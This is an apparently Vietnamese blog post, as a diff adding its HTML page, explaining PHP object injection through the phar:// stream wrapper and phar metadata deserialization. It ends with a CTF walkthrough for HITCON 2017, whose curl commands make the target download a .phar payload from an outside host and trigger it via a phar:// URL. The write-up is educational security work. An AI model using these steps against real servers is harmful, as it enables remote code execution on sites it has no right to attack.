@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Hugo Theme  | Php Object Injection Without Unserialize</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.1/css/bulma.min.css" />
+    <link rel="stylesheet" href="https://hungry-visvesvaraya-d246d6.netlify.com/css/blog.css" />
+    
+</head>
+<body>
+
+    
+    <nav class="navbar is-fixed-top" role="navigation" aria-label="main navigation">
+        <div class="navbar-brand">
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/">Home</a>
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/about">About</a>
+        </div>
+    </nav>
+    
+
+    
+    <section class="hero is-info is-medium">
+        <div class="hero-body" style="background-image: url(https://hungry-visvesvaraya-d246d6.netlify.com/img/bg-blog.jpg);">
+            <div class="container has-text-centered">
+                <br>
+                <h1 class="title is-size-1">
+                    
+                        Php Object Injection Without Unserialize
+                    
+                </h1>
+                
+            </div>
+        </div>
+    </section>
+
+
+<div class="container">
+    <div class="section">
+    
+
+<div class="columns">
+    <div class="column is-9">
+        <div class="tile is-child box">
+            <div class="content">
+                
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/phar_background.png"/> 
+</figure>
+
+
+<h1 id="stream-wrapper">Stream wrapper</h1>
+
+<p>Trong php có khái niệm gọi là stream wrapper, nói về các giao thức trong cách xử lý url, được sử dụng cùng với hàm filesystem  như fopen, copy, file_exists, filesize.</p>
+
+<table>
+<thead>
+<tr>
+<th>file://</th>
+<th align="center">http://</th>
+<th align="right">ftp://</th>
+<th align="center">php://</th>
+<th align="center">zlib://</th>
+<th align="center">data://</th>
+<th align="center">glob://</th>
+<th align="center">phar://</th>
+</tr>
+</thead>
+
+<tbody>
+</tbody>
+</table>
+
+<pre><code>A wrapper is additional code which tells the stream how to handle specific protocols/encodings.
+</code></pre>
+
+<h1 id="phar">Phar</h1>
+
+<p>Những wrapper này đều có thể lợi dụng để khai thác nhiều loại lỗ hổng. <code>Phar</code> wrapper là php archive. Dùng để nén tệp và siêu dữ liệu. Phar không thể sử dụng cho truy cập file từ xa.
+Cấu trúc của phar gồm: stub, manifest, file content, signature.</p>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/phar_phar-structure.png"/> 
+</figure>
+
+
+<p><strong>Stub</strong></p>
+
+<p><code>__HALT_COMPILER()</code> là hàm dừng thực thi code trong file php.</p>
+
+<pre><code>$ php -r &quot;echo 'Test'; __HALT_COMPILER(); echo 'stub';&quot;
+&gt; Test
+&gt;
+</code></pre>
+
+<p><code>Stub</code> là một đoạn code php đơn giản. Sử dụng <code>__HALT_COMPILER</code> mô tả code php, vì không muốn chương trình biên dịch và thực thi đoạn code php phía sau.</p>
+
+<p><strong>Manifest</strong></p>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/phar_manifest.png"/> 
+</figure>
+
+
+<p>Các byte đầu mô tả thông tin của phar gồm các thông tin của file nén bên trong, version, &hellip; Trong đó có đoạn byte gần cuối là định dạng của <a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/">serialize php</a>.
+Vậy, bản chất trong phar đã có serialize và chắc một điều là sẽ có 1 giai đoạn nào đó phải sử dụng đến unserialize. Đó là lúc giải nén các file bên trong của tệp phar.</p>
+
+<p><strong>File contents</strong></p>
+
+<p>Chứa nội dung được nén bên trong</p>
+
+<p><strong>Signature</strong></p>
+
+<p>Phần chữ kí dùng để xác minh tính toàn vẹn của tệp phar, chỉ cần thay đổi 1 yếu tố trong tệp thì chữ kí này giúp để xác minh sự thay đổi đó.</p>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/phar_xxd-file-phar.png"/> 
+</figure>
+
+
+<p>Chúng ta có thể thấy, phần stub ở trên đầu của file (<code>&lt;?php __HALT_COMPILER(); ?&gt;</code>), vì phần này mình có thể tự do tùy chỉnh nên giúp cho việc tạo định dạng file fake rất dễ. Tiếp theo là đoạn <code>O:7:&quot;example&quot;:1:{...</code> là dữ liệu serialize, lợi dụng điểm này mình có thể override dữ liệu tạo ra payload tấn công object injection. <code>test.txt</code>  là nội dung file nén bên trong. Cuối cùng, là đoạn signature để xác minh tính toàn vẹn dữ liệu.</p>
+
+<h1 id="kịch-bản-tấn-công">Kịch bản tấn công</h1>
+
+<p>Thông thường nhiều trang web có tính năng upload ảnh và cho tự do chèn địa chỉ ảnh. Cách ngăn chặn những lỗi tấn công không biết trước thường mọi lập trình viên chỉ dùng function <code>file_exists()</code> để kiểm tra file. Nhưng đây lại là tác nhân gây ra lỗi object injection dùng phar.</p>
+
+<ul>
+<li><em>Bước 0</em>: Khởi tạo payload, cần biết trước trên server có những class nào đã được định nghĩa. Điều này về lý thuyết có vẻ khó, nhưng các ứng dụng lớn thông thường sử dụng những class phổ biến, cho nên có thể khảo sát qua nhiều sourcecode của các trang web lớn.</li>
+<li><em>Bước 1</em>: vì phar không thể tương tác file từ xa, chúng ta cần upload file payload lên server. Có thể dễ dàng qua mặt các filter bằng cách tạo file phar với stub là header file ảnh.</li>
+<li><em>Bước 2</em>: Cần tùy chỉnh được url trong các function: include(), fopen(), file_get_contents(), file(), &hellip; Url dạng <code>phar:///usr/share/payload.phar.jpg</code></li>
+</ul>
+
+<h1 id="capture-the-flag-orange-tw-https-github-com-orangetw-my-ctf-web-challenges-babyh-master-php-2017">Capture The Flag (<a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017">orange.tw</a>)</h1>
+
+<p><strong>Baby^H Master PHP 2017 | HITCON 2017 Quals</strong></p>
+
+<p><a href="{{/resources/php_obj_inj_without_unserialize/index.php}}">source code index.php</a></p>
+
+<pre><code># Get a cookie
+$ curl http://host/ --cookie-jar cookie
+
+# Download .phar file from http://orange.tw/avatar.gif
+$ curl -b cookie 'http://host/?m=upload&amp;url=http://orange.tw/'
+
+# Get flag
+$ curl -b cookie &quot;http://host/?m=upload&amp;url=phar:///var/www/data/$MD5_IP/&amp;lucky=%00lambda_1&quot;
+</code></pre>
+
+            </div>
+        </div>
+    </div>
+    <div class="column is-3">
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Tags</h1>
+        <div class="tags">
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/ctf">ctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/cve">cve</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/flask">flask</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/laravel">laravel</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/matesctf">matesctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/php">php</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/python">python</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/serialization">serialization</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-2018">svattt-2018</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-final-2018">svattt-final-2018</a></span>
+        
+        </div>          
+    </div>
+</div><br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Recent posts</h1>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/new_year_2019/">New year 2019</a></h1>
+            <time class="has-text-grey-light is-size-7">1 January 2019</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_final_2018_web_2_roundcube_mail/">SVATTT final 2018 - roundcube mail</a></h1>
+            <time class="has-text-grey-light is-size-7">20 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_2018_web_3_secure_document_service/">SVATTT 2018 - Secure document service</a></h1>
+            <time class="has-text-grey-light is-size-7">5 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/laravel-object-injection-to-rce/">Laravel object injection to RCE</a></h1>
+            <time class="has-text-grey-light is-size-7">25 October 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/php_object_injection_without_unserialize/">Php Object Injection Without Unserialize</a></h1>
+            <time class="has-text-grey-light is-size-7">20 September 2018</time>
+        
+    </div>
+</div>
+    <br>
+                
+
+
+    
+<br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Archives</h1>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2019">2019</a> (1)<br>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2018">2018</a> (9)<br>
+        
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+    </div>
+    
+    <div id="disqus_thread"></div>
+</div>
+
+
+<script>
+
+
+
+
+var disqus_config = function () {
+this.page.url = "https:\/\/hungry-visvesvaraya-d246d6.netlify.com\/";  
+this.page.identifier = "blog-kev"; 
+};
+
+(function() { 
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-kev.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+
+<footer class="footer has-background-grey-darker has-text-white">
+    <div class="content has-text-centered">
+        <p>
+            <span class="icon is-large"><a href="https://twitter.com/" class="mysocial"><i class="fab fa-twitter fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://www.youtube.com/" class="mysocial"><i class="fab fa-youtube fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://github.com/" class="mysocial"><i class="fab fa-github fa-3x"></i></a></span>&nbsp;&nbsp;
+            <br><br>
+            Copyright &copy; Hugo Theme 2019</a>
+        </p>
+    </div>
+</footer>
+
+<script defer src="https://use.fontawesome.com/releases/v5.1.0/js/all.js"></script>
+
+<script id="dsq-count-scr" src="//blog-kev.disqus.com/count.js" async></script>
+</body>
+</html>
